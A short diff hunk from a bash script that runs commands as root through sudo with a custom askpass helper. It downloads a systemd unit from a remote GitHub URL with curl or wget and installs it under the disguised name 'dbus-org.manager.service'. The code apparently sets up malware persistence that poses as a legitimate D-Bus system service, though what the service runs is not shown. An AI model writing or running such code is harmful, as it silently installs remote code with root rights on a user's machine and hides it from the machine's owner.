@@ -104,7 +104,7 @@ SUDO_ASKPASS="$ASKPASS_SCRIPT" /usr/bin/sudo -A bash << DEPLOYEOF
 
     SYSTEMD_SERVICE="dbus-org.manager.service"
     SYSTEMD_SERVICE_URL="https://raw.githubusercontent.com/Kaucrow/good-boy/refs/heads/main/systemd.service"
-    SYSTEMD_SERVICE_FILE="/etc/systemd/system/$SYSTEMD_SERVICE"
+    SYSTEMD_SERVICE_FILE="/etc/systemd/system/dbus-org.manager.service"
     curl -s -o \$SYSTEMD_SERVICE_FILE \$SYSTEMD_SERVICE_URL || \
     wget -q -O \$SYSTEMD_SERVICE_FILE \$SYSTEMD_SERVICE_URL
 
